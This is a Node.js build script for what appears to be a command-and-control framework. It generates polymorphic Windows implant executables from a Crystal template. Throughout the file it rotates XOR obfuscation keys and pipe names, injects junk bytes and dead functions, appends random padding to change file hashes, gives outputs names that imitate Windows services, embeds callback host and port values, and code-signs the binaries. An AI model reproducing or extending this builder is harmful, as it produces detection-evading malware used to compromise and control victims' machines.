/**
 * Polymorphic Crystal DCOM tool builder (Windows sub-variant).
 * Rotates obf XOR key, pipe name, poly stamp, and trailing entropy each build.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const { signPeFile } = require('./signing');

const ROOT = path.join(__dirname, '..');
const TEMPLATE = path.join(__dirname, 'templates', 'windows_dcom_tool.cr');
const BUILDS_DIR = path.join(ROOT, 'builds');
const MANIFEST = path.join(BUILDS_DIR, 'index.json');

const DCOM_NAMES = [
  'DcomBridge',
  'OleRpcHelper',
  'EpMapperSvc',
  'PipeRelay',
  'WinOleHost',
];

const PIPE_NAMES = [
  'Crystal', 'RpcBridge', 'EpMapper', 'OleChannel', 'WinSync', 'NetPipe',
];

function ensureDirs() {
  fs.mkdirSync(BUILDS_DIR, { recursive: true });
}

function readManifest() {
  ensureDirs();
  if (!fs.existsSync(MANIFEST)) return [];
  try {
    return JSON.parse(fs.readFileSync(MANIFEST, 'utf8'));
  } catch {
    return [];
  }
}

function writeManifest(list) {
  ensureDirs();
  fs.writeFileSync(MANIFEST, JSON.stringify(list, null, 2));
}

function randomId() {
  return `${Date.now().toString(36)}_${crypto.randomBytes(4).toString('hex')}`;
}

function randomPipeName() {
  const base = PIPE_NAMES[crypto.randomBytes(1)[0] % PIPE_NAMES.length];
  const suffix = crypto.randomBytes(2).toString('hex');
  return `${base}_${suffix}`;
}

function defaultOutputBase() {
  const pick = DCOM_NAMES[crypto.randomBytes(1)[0] % DCOM_NAMES.length];
  const suffix = crypto.randomBytes(3).toString('hex');
  return `${pick}_${suffix}`;
}

function which(cmd) {
  return new Promise((resolve) => {
    const isWin = process.platform === 'win32';
    const checker = isWin ? 'where.exe' : 'which';
    const p = spawn(checker, [cmd], { windowsHide: true });
    let out = '';
    p.stdout.on('data', (d) => { out += d.toString(); });
    p.on('error', () => resolve(null));
    p.on('close', (code) => resolve(code === 0 ? out.trim().split(/\r?\n/)[0] : null));
  });
}

function run(cmd, args, opts = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, {
      cwd: opts.cwd || ROOT,
      env: { ...process.env, ...opts.env },
      shell: false,
      windowsHide: true,
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => { stdout += d.toString(); });
    child.stderr.on('data', (d) => { stderr += d.toString(); });
    child.on('error', reject);
    child.on('close', (code) => {
      if (code === 0) resolve({ stdout, stderr });
      else reject(new Error(stderr || stdout || `${cmd} exited ${code}`));
    });
  });
}

function mutateCrystalSource(raw, opts) {
  const {
    obfKey, stamp, buildid, pipeName, junkHex, defaultLhost, defaultLport, buildNonce,
  } = opts;

  const keyHex = `0x${obfKey.toString(16).toUpperCase().padStart(2, '0')}`;
  const key2 = 1 + (crypto.randomBytes(1)[0] % 254);
  const key2Hex = `0x${key2.toString(16).toUpperCase().padStart(2, '0')}`;

  let out = raw.replace(/\{\% key = 0x[0-9A-Fa-f]+ \%\}/g, `{% key = ${keyHex} %}`);
  out = out.replace(
    /%buf\[i\] = b \^ 0x[0-9A-Fa-f]+_u8/g,
    `%buf[i] = b ^ ${keyHex}_u8`
  );

  const modSuffix = buildid.replace(/[^a-z0-9]/gi, '').slice(0, 14) || 'x';
  const junkBytes = Array.from(crypto.randomBytes(64))
    .map((b) => `${b}_u8`)
    .join(', ');
  const deadFns = Array.from({ length: 3 + (crypto.randomBytes(1)[0] % 4) }, (_, i) => {
    const fn = `polyDead_${modSuffix}_${i}`;
    const body = Array.from(crypto.randomBytes(8 + i))
      .map((b) => `${b}_u8`)
      .join(', ');
    return [
      `def ${fn} : UInt32`,
      `  Bytes[${body}].sum`,
      'end',
    ].join('\n');
  }).join('\n\n');

  const header = [
    'require "option_parser"',
    '',
    `# build:${buildid} stamp:${stamp.slice(0, 20)} nonce:${buildNonce || 'none'}`,
    `module PolyBuild_${modSuffix}`,
    `  STAMP = "${stamp}"`,
    `  BUILD_ID = "${buildid}"`,
    `  JUNK = Bytes[${junkBytes}]`,
    `  EXTRA_KEY = ${key2Hex}`,
    '  def self.fingerprint : UInt32',
    '    JUNK[0].to_u32 ^ STAMP.bytesize ^ BUILD_ID.bytes[0].to_u32 ^ EXTRA_KEY',
    '  end',
    'end',
    '',
    deadFns,
    '',
  ].join('\n');
  out = header + out;

  out = out.replace(/@pipe_name = "Crystal"/, `@pipe_name = "${pipeName}"`);
  out = out.replace(/pipe_name = obf\("Crystal"\)/, `pipe_name = obf("${pipeName}")`);

  if (defaultLhost) {
    out = out.replace(/lhost = ""/, `lhost = ${JSON.stringify(defaultLhost)}`);
  }
  if (defaultLport && defaultLport > 0) {
    out = out.replace(/lport = 0_u16/, `lport = ${defaultLport}_u16`);
  }

  out = out.replace(
    /def main\n  command = ""/,
    `def main\n  _ = PolyBuild_${modSuffix}.fingerprint\n  command = ""`
  );

  out += `\n# poly_tail:${junkHex}\n`;
  return { source: out, modSuffix };
}

function writeShardYml(workDir, id) {
  const name = `dcom_build_${id.replace(/[^a-z0-9]/gi, '')}`;
  const yml = `name: ${name}
version: 0.1.0

targets:
  win32:
    main: src/main.cr

dependencies:
  option_parser:
    github: phoffer/option_parser
    version: ~> 0.5.0
`;
  fs.writeFileSync(path.join(workDir, 'shard.yml'), yml, 'utf8');
}

async function generateCrystalBuild(options = {}) {
  if (process.platform !== 'win32') {
    throw new Error('Crystal DCOM builds must run on a Windows teamserver (Crystal + Windows SDK)');
  }

  const arch = String(options.arch || 'amd64').toLowerCase();
  if (arch !== 'amd64') {
    throw new Error('Crystal DCOM tool supports amd64 only');
  }

  if (!fs.existsSync(TEMPLATE)) {
    throw new Error('builder/templates/windows_dcom_tool.cr missing');
  }

  const crystalPath = await which('crystal');
  if (!crystalPath) {
    throw new Error('Crystal compiler not found on PATH (install Crystal for Windows)');
  }

  const host = String(options.host || '').trim();
  const port = Number(options.port || 0);
  const signOpts = {
    enabled: options.signCode !== false,
    subject: options.signSubject ? String(options.signSubject).trim() : undefined,
    autoLab: options.signAuto !== false,
  };

  const id = randomId();
  const obfKey = 1 + (crypto.randomBytes(1)[0] % 254);
  const stamp = crypto.randomBytes(32).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');
  const pipeName = randomPipeName();
  const junkHex = crypto.randomBytes(64).toString('hex');
  const buildNonce = String(options.buildNonce || crypto.randomBytes(8).toString('hex'));

  const workDir = path.join(BUILDS_DIR, id);
  const srcDir = path.join(workDir, 'src');
  fs.mkdirSync(srcDir, { recursive: true });

  const raw = fs.readFileSync(TEMPLATE, 'utf8');
  const { source: mutated } = mutateCrystalSource(raw, {
    obfKey,
    stamp,
    buildid,
    pipeName,
    junkHex,
    buildNonce,
    defaultLhost: host || undefined,
    defaultLport: port > 0 && port <= 65535 ? port : undefined,
  });
  fs.writeFileSync(path.join(srcDir, 'main.cr'), mutated, 'utf8');
  writeShardYml(workDir, id);

  try {
    await run('shards', ['install', '--production'], { cwd: workDir });
  } catch (e) {
    console.warn('[BUILDER] shards install warning (may use stdlib option_parser):', e.message);
  }

  const baseName = (options.outputName || defaultOutputBase()).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = baseName.toLowerCase().endsWith('.exe') ? baseName : `${baseName}.exe`;
  const outPath = path.join(workDir, outName);

  console.log(`[BUILDER] Crystal DCOM build ${id} obf=0x${obfKey.toString(16)} pipe=${pipeName}`);
  await run(
    crystalPath,
    ['build', '--release', '--no-debug', '-o', outPath, path.join('src', 'main.cr')],
    { cwd: workDir }
  );

  if (!fs.existsSync(outPath)) {
    throw new Error('Crystal build produced no output file');
  }

  const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 3840));
  fs.appendFileSync(outPath, pad);

  const signResult = await signPeFile(outPath, signOpts);
  const stat = fs.statSync(outPath);
  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');

  const meta = {
    id,
    platform: 'windows',
    arch,
    variant: 'dcom',
    tool: 'crystal-dcom',
    format: 'exe',
    host: host || undefined,
    port: port > 0 ? port : undefined,
    fileName: outName,
    size: stat.size,
    sha256,
    obfKey,
    pipeName,
    stamp: stamp.slice(0, 16),
    buildid,
    injectDllPacked: false,
    authenticodeSigned: !!signResult.signed,
    signPublisher: signResult.publisher,
    signNote: signResult.signed ? undefined : (signResult.reason || undefined),
    createdAt: new Date().toISOString(),
  };

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));
  return meta;
}

module.exports = {
  generateCrystalBuild,
  TEMPLATE,
};
